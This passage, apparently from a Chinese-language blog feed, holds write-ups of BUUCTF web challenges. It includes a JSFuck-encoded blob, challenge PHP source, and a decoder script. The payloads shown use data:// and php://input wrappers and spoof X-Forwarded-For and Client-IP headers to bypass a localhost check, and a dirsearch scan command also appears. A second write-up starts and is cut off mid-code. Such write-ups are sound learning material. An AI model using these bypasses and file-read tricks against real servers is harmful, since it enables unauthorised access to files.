class="hljs-comment">[]</span>]</span>+(+(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>))<span class="hljs-comment">[(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+((+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>]</span>(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>()<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>)<br>--&gt;<br></code></pre></td></tr></table></figure><p>查了下这东西叫<code>jsfuck</code>编码，可以用<code>[CTF在线工具-在线JSfuck加密|在线JSfuck解密|JSfuck|JSfuck原理|JSfuck算法 (hiencode.com)](http://www.hiencode.com/jsfuck.html)</code>解码(我看其它师傅都是直接丢到控制台里运行)。</p><p>解码后是<code>alert(&quot;post me Merak&quot;))</code>，<code>POST</code>随便传个值：<code>Merak=333</code>，同时修改<code>X-Forwarded-For: 127.0.0.1</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs PHP">Flag is here~But how to get it? <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <span class="hljs-comment">//ord返回ASCII值，chr返回对应的ASCII字符</span><br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们的目标是<code>flag.php</code>,<code>/?file</code>的值经过了简单的加密过程，逆着回去就行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$v</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dechange</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;<br><span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>); <span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) - <span class="hljs-variable">$i</span> * <span class="hljs-number">2</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$re</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dechange</span>(<span class="hljs-variable">$v</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ZmpdYSZmXGI=</span><br></code></pre></td></tr></table></figure><p>所以给<code>file</code>赋值<code>ZmpdYSZmXGI=</code>，注意要求<code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;</code>，找个伪协议写进去就行：</p><p><code>?2333=data://text/plain,todat is a happy day</code>或者利用POST方式和<code>input</code>组合</p><p><code>?2333=php://input然后数据是 todat is a happy day</code></p><p>最后别忘了加个<code>IP</code>。</p><p>这个<code>payload</code>提示<code>Flag is here~But how to get it?Local access only!&lt;br/&gt;Sorry,you don&#39;t have permission!  Your ip is :sorry,this way is banned! </code>。。<code>XFF</code>头不能用，改成<code>Client-IP</code>试了试，拿到<code>flag</code>:<code>flag&#123;b5aec9ee-7acb-45a4-b8e3-fbe4ae51f2f4&#125;</code></p><p><img src="/img/taowa4.png" alt="taowa4"></p><p>然后利用<code>input</code>伪协议去写<code>todat is a happy day</code>也行，我没有尝试，这里直接借用了这位师傅的结果：</p><p>参考<code>https://www.cnblogs.com/rabbittt/p/13291746.html</code>:</p><p><img src="/img/taowa5.png" alt="taowa5"></p><p>其实这里还有个问题，我利用<code>GET</code>传参习惯在问号前面加个<code>/</code>，比如这题一开始我写的<code>secrettw.php/?balabala</code>，但发现行不通。。看来以后做题要把这个习惯改掉。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTF做题记录_2</title>
    <link href="/2023/10/30/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/"/>
    <url>/2023/10/30/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>进环境发现是这么个东西，<code>URL</code>值得注意：</p><p><code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code></p><p><img src="/img/anxunbei1.png" alt="anxunbei1"></p><p>右键源码还可以发现一行字：<code>md5 is funny ~</code>(和md5有关？)，估计是被藏到图片后面了。</p><p>先在kali下用dirsearch扫一下看看有没有其它文件：</p><p><code>dirsearch -u http://55a28404-cd69-4529-9626-2cd4d4f499d1.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p>没有什么有用的信息。看看源码：</p><p><img src="/img/anxunbei3.png" alt="anxunbei3"></p><p>选中那段字符提示了base64，利用base64转图片工具转换结果就是左上角那张图片。但很明显URL中不是这个东西，应该是将文件名进行了变化。</p><p>img参数是大小写字母加数字的组合，猜测是<code>base64</code>，而且随便输个<code>abc</code>再看源码会发现这么个东西：</p><p><img src="/img/anxunbei2.png" alt="anxunbei2"></p><p>直接base64解码：<code>MzUzNTM1MmU3MDZlNjc=</code>，又是一串<code>base64</code>再解码：<code>3535352e706e67</code>。看着像十六进制，解一下：<code>555.png</code></p><p>现在这个参数怎么出来的就清楚了：字符串先经过十六进制，再经过两次base64加密。前面猜测这是个<code>include</code>的参数，因为这个<code>img</code>和<code>cmd</code>参数都是在index.php下的，那就直接看<code>index.php</code>是啥东西(用同样的方法转换):img&#x3D;<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 